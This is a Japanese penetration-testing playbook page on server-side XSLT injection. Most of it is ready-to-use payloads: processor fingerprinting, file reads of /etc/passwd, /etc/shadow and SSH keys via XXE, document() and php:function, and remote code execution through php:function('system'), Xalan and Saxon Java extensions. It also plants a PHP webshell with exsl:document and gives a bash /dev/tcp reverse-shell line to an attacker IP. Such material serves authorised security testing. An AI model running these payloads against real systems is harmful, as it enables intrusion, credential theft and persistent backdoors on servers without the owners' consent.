# XSLTインジェクション

> **スコープ**: サーバー側 XSLT 処理に対するインジェクション。プロセッサのフィンガープリント〜XXE 経由ファイル読込〜`document()` / PHP 拡張によるファイル読込・RCE〜Xalan / Saxon の Java 拡張 RCE〜EXSLT による任意ファイル書込（webshell 設置）までを扱う。取得した認証情報・シェル後の活動は `../Credential_Discovery.md` / `../../03_Post_Access_Linux/Shell_Stabilization.md` を参照。

> **[HIGH IMPACT]** §4〜§7 は RCE・任意ファイル書込を含む：
> - [x] 不可逆な設定変更を含む（§7 任意ファイル書込 = webshell 設置）
> - [x] RCE 経路（§4 php:function / §5 Xalan / §6 Saxon）
> - [ ] 持続化に該当（webshell を消し忘れるとバックドア化 → 原状回復必須）
> - [ ] 業務停止リスク
>
> RCE / 書込は事前合意で明示確認すること。書込先・ファイル名は kedalab テスト識別子を含めて原状回復しやすくする。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件
- Web アプリが XSLT ファイルのアップロードまたは指定を受け付けている
- アプリが XML と XSLT を組み合わせてサーバー側で変換処理を行っている（例: nmap の XML 結果を整形して HTML 表示する機能）
- カスタム XSLT の内容がサーバー側で実行されている（出力に XSLT の評価結果が反映される）

## 環境前提
- 実行環境: テスター端末（ペイロード作成）/ ターゲット（XSLT 処理実行）
- 必要なツール: テキストエディタ、Burp Suite（任意）。特別なインストール不要
- オフライン代替: ペイロード作成はオフラインで完結する。RCE のコールバックには `../../06_Concepts/Reverse_Shell.md` の受信準備を参照

## 先に確認すること

- アプリが XSLT ファイルのアップロードを受け付けているか、または XSLT を選択・指定できるか
- レスポンスに XSLT 変換の出力が含まれているか（エラーメッセージも手がかり）
- エラーメッセージに XSLT プロセッサ名・バージョンが含まれていないか
- **操作の前提**: アプリが XML と XSLT を両方アップロードする仕組みの場合、**元の XML ファイルはそのまま使い、XSLT ファイルだけを差し替えてアップロードする**

**XSLT プロセッサ別の攻撃面（§1 のフィンガープリントで判別する早見表）:**

| プロセッサ | フィンガープリント値 | 主な攻撃面 |
|-----------|---------------------|-----------|
| libxslt（C）| `vendor-url: http://xmlsoft.org/XSLT/` | XXE-via-XSLT（§2）・PHP 拡張（§4）・EXSLT 書込（§7）。`document()` は多くのビルドでブロック |
| Saxon（Java）| `vendor: SAXON`・バージョン番号 | XSLT 2.0/3.0。`unparsed-text()` / `document()`（§3）。PE/EE なら Java 拡張 RCE（§6） |
| Xalan（Java）| `vendor: Apache Software Foundation` | Java 拡張要素（§5）で RCE |
| .NET XslCompiledTransform | `vendor: Microsoft` | `msxsl:script` 拡張が有効なら C# コード実行 |

**攻撃者の思考トレース:** XSLT インジェクションはまず「どのプロセッサか」で攻撃面が分岐する。だから §1 の `system-property()` フィンガープリントを必ず最初に通し、出力 vendor に応じて §2 以降の手を選ぶ。読み（XXE / document / php read）→ 書き（EXSLT）→ RCE（Java 拡張）の順で、リスクの低い情報取得から試す。

---

## 1. プロセッサのフィンガープリント（最初に必ず実施）

**コマンド（XSLT ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <ul>
          <li>Vendor: <xsl:value-of select="system-property('xsl:vendor')"/></li>
          <li>Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/></li>
          <li>Version: <xsl:value-of select="system-property('xsl:version')"/></li>
        </ul>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

`system-property()` 関数は多くのプロセッサで制限されないため、最初のプローブとして使う。

**観測される出力 → 次のアクション:**

| 出力値 | 意味 | 次のアクション |
|--------|------|------------|
| `Vendor URL: http://xmlsoft.org/XSLT/` | libxslt（C）。PHP 連携の場合もある | §2 → §4 → §7 → §3 の順（§7 EXSLT 書込はビルド依存・§3 `document()` は libxslt でほぼブロックされるため最後）|
| `Vendor: SAXON` + edition が `Saxon-PE` / `Saxon-EE` | Saxon（Java）有償版。Java 拡張関数が有効 | §6 `saxon:evaluate` + `java.lang.Runtime` 経由 RCE が射程 |
| `Vendor: SAXON` + edition が `Saxon-HE` | Saxon（Java）無償版。Java 拡張関数なし | §3 `document()` / `unparsed-text()` でファイル読み・SSRF。RCE は版数 CVE 依存 |
| `Vendor: SAXON` のみ（edition 不明） | Saxon の古いバージョン | searchsploit / NVD で CVE 確認。§3 → §6 → §7 の順 |
| `Vendor: Apache Software Foundation` | Xalan（Java） | §5 Java 拡張要素（`rt:exec`）|
| `Vendor: Microsoft` | .NET XslCompiledTransform | `msxsl:script` 拡張（C# コード埋め込み）|
| `Version: 1.0` | XSLT 1.0 のみ対応 | `unparsed-text()` 等の 2.0 機能は使えない |
| `Version: 2.0` / `3.0` | XSLT 2.0/3.0 対応（Saxon 系）| `unparsed-text('file:///etc/passwd')` を試す |

**注意:** `system-property('xsl:product-name')` で `Saxon-EE` / `Saxon-PE` の文字列が見えるかも確認すると、§6 の Java 拡張 RCE が刺さるかを早期判別できる。

---

## 2. XXE-via-XSLT（libxslt を含む多くのプロセッサで試す）

XSLT ファイル自体の DOCTYPE でエンティティを宣言することでファイルを読み込む。

**コマンド（XSLT ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <pre>&xxe;</pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**ファイルが読めたら次にすること（§2 / §3 / §4 共通）:**

`/etc/passwd` の内容が取得できたら以下の順で展開する（`username:x:uid:gid:comment:home:shell` の 7 フィールド・末尾がシェル・6 番目がホーム）:

```
alice:x:1001:1001::/home/alice:/bin/bash     ← 有効（/bin/bash）
www-data:x:33:33::/var/www:/usr/sbin/nologin ← 除外（nologin）
root:x:0:0:root:/root:/bin/bash              ← 有効（root は特に重要）
```

1. 有効ユーザーの資産: `file:///home/[USERNAME]/.ssh/id_rsa`（SSH 秘密鍵）/ `file:///home/[USERNAME]/.bash_history`（過去コマンドの認証情報）
2. Web アプリ設定ファイル（ドキュメントルートはアプリ名で特定 → `../../05_Tools_Reference/Searchsploit.md`）
3. `/etc/shadow`（読めればハッシュ → `../../05_Tools_Reference/Hashcat.md`）

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `<pre>` に `/etc/passwd` の内容 | XXE-via-XSLT 成立 | 上記の順でファイル読み展開 → `../Credential_Discovery.md` |
| `Entity 'xxe' not defined` | DOCTYPE でエンティティ未宣言 | `<!DOCTYPE xsl:stylesheet [...]>` の内側に宣言 |
| 何も出ない / 静的 HTML | XXE がブロック / 未実行 | §3 `document()` / §4 PHP 拡張へ |

**注意:** 原理 → `../../06_Concepts/XSLT_XML_Processing.md`

---

## 3. `document()` 関数によるファイル読み込み（Saxon 等で有効な場合）

**コマンド（XSLT ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <pre><xsl:copy-of select="document('file:///etc/passwd')"/></pre>
    <!-- 相対パス形式でも試す -->
    <pre><xsl:copy-of select="document('/etc/passwd')"/></pre>
  </xsl:template>
</xsl:stylesheet>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ファイル内容が返る | `document()` 有効 | §2 の「ファイルが読めたら」展開へ |
| `Cannot resolve URI /etc/passwd` | URI 形式の問題 | `file:///etc/passwd` 形式を試す |
| libxslt で全くブロック | セキュアビルド | §2 XXE / §4 PHP 拡張、または SSRF 転換（`document('http://[ATTACKER_IP]:8000/')`）|

**注意:** libxslt 1.x は `document()` の外部 URI（`file://`）を禁止しているビルドが多い。返り値は XML ノードセットなので、対象が XML 形式でない場合は `<xsl:value-of>` の方がテキスト出力しやすい。

---

## 4. PHP 名前空間拡張（PHP + libxslt の場合）

**コマンド（ファイル読込）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <pre><xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/></pre>
  </xsl:template>
</xsl:stylesheet>
```

**コマンド（RCE — `file_get_contents` を `system` / `passthru` に差し替え）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <pre><xsl:value-of select="php:function('system', 'id')"/></pre>
  </xsl:template>
</xsl:stylesheet>
```

`'id'` を `'whoami'` 等に書き換えて都度アップロード。リバースシェルは `'id'` の位置に `bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'` 等を入れる。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `file_get_contents` でファイル内容 | PHP 拡張有効 | `system` に差し替えて RCE へ |
| `php:function('system','id')` で `uid=...` | **RCE 成立** | リバースシェル → `../../03_Post_Access_Linux/Shell_Stabilization.md` |
| `XPath evaluation returned no result` | `registerPHPFunctions()` 無効 | §5 / §6 / §7 の別経路へ |

**注意:** `php:function()` が `registerPHPFunctions()` で明示的に有効化されていないと動かない。`cmd=id` のような URL パラメータは不要（XSLT 内に直接コマンドを書く）。

---

## 5. Java プロセッサ（Xalan）の拡張要素による RCE

**コマンド（XSLT ペイロード）:**

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(), 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| コマンド実行の痕跡（プロセスオブジェクト等） | Xalan Java 拡張有効 | 出力を取得する形に整形 / リバースシェルへ |
| 拡張が無効でエラー | クラスパスに JAR なし | `system-property()` のバージョンから CVE を調べる |

**注意:** Xalan の `rt:exec` は Process オブジェクトを返すため、標準出力を文字列化する追加処理が必要なことがある。確実な実行確認はリバースシェルや out-of-band（DNS/HTTP コールバック）で行う。

---

## 6. Saxon-PE / Saxon-EE の Java extension functions による RCE

Saxon-HE（無償版）には Java 拡張関数は無いが、**Saxon-PE / Saxon-EE では `java.lang.*` を XSLT から呼び出せる**ため RCE 経路になる。

**コマンド（XSLT ペイロード）:**

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="2.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:saxon="http://saxon.sf.net/"
                xmlns:Runtime="java:java.lang.Runtime">
  <xsl:template match="/">
    <!-- saxon:evaluate で動的に XPath / XQuery 式を評価 → 拡張関数経由でコマンド実行 -->
    <xsl:value-of select="saxon:evaluate('Runtime:exec(Runtime:getRuntime(), &quot;id&quot;)')"/>
  </xsl:template>
</xsl:stylesheet>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| コマンドが実行される | Saxon-PE / EE 確定・RCE 成立 | リバースシェルへ → `../../03_Post_Access_Linux/Shell_Stabilization.md` |
| `Cannot find a 1-argument function named saxon:evaluate` | Saxon-HE（拡張なし）の可能性 | §3 `document()` / `unparsed-text()` のファイル読みに留める |

**注意:** `system-property('xsl:product-name')` で `Saxon-EE` / `Saxon-PE` の文字列を最初に確認する。HE の場合は刺さらない。

---

## 7. libxslt の `exsl:document` / `xsl:result-document` による任意ファイル書込

EXSLT（`http://exslt.org/common`）拡張がビルドに含まれている libxslt では、**仕様上の機能**として `exsl:document` で任意パスにファイルを書き出せる（脆弱性ではなくドキュメント化された機能）。XSLT 2.0 系（Saxon）では `xsl:result-document` が同等。書込先に Web ルートを指定すれば webshell 設置が可能。

**コマンド（libxslt + EXSLT 版）:**

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exsl="http://exslt.org/common"
                extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/html/kedalab-[CASE_ID]_shell.php" method="text">
      <xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

**コマンド（XSLT 2.0 / Saxon 版）:**

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:result-document href="file:///var/www/html/kedalab-[CASE_ID]_shell.php" method="text">
      <xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 書込後 `curl http://[TARGET]/kedalab-[CASE_ID]_shell.php?c=id` で `uid=...` | 任意ファイル書込 + webshell 成立 | RCE 確立 → シェル安定化。**原状回復で webshell を削除** |
| 書込が成功しない | security framework / `xsltSetSecurityPrefs()` でブロック | §4〜§6 の RCE 経路へ |

**注意:** **任意ファイル書込は不可逆操作**。書込先・ファイル名は kedalab テスト識別子（`kedalab-[CASE_ID]_shell.php`）を含めて原状回復で grep 削除しやすくする。`xsltSetSecurityPrefs()` / `xsltproc --nowrite` 相当でブロックされる。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|------|---------|---------|
| `system-property()` も出力されない・静的 HTML だけ返る | XSLT がサーバー側で実行されていない | アップロードした XSLT がそのまま保存されるだけ → ストレージへのパストラバーサル等を検討 |
| すべての試みで `Exploit Attempted` のみ表示 | WAF・アプリシグネチャが検出 | アップロード以外の攻撃面（他パラメータ・他機能）を探す。ペイロードのキーワード（`document()` / `php:function`）を疑う |
| libxslt で `document()` も XXE-via-XSLT もブロック | libxslt のセキュアビルド | 外部 URL 向け SSRF への転換（`document('http://[ATTACKER_IP]:8000/')` で疎通確認）→ `./SSRF.md` |
| Saxon/Xalan を確認できたのに拡張が使えない | クラスパスに必要な JAR がない | `system-property()` のバージョンから CVE を調べる |

---

## 注意点・落とし穴

- `&xxe;` で `Entity 'xxe' not defined` が出る場合は DOCTYPE でエンティティを宣言していない（`<!DOCTYPE xsl:stylesheet [...]>` の内側に書く）
- WAF シグネチャを避けるためエンティティ名を変えても `Exploit Attempted` が出る場合は、ペイロードパターン全体を疑う

> **個別ブロック固有の注意は各 §N の「注意:」を参照。** §7 任意ファイル書込の原状回復は必須。

---

## 関連技術
- 前：XML アップロード機能の発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：XXE（XML のみでの攻撃） → `XXE.md`
- 後：ファイル読み込みで認証情報取得 → `../Credential_Discovery.md`
- 後：SSRF への転換（`document('http://...')` を使った内部ネットワーク探索）→ `SSRF.md`
- 後：シェル取得後の安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：取得した /etc/shadow ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- 関連：製品構造調査・設定ファイルパスの特定 → `../../05_Tools_Reference/Searchsploit.md`
- 関連：XSLT プロセッサの動作原理・外部エンティティ処理 → `../../06_Concepts/XSLT_XML_Processing.md`
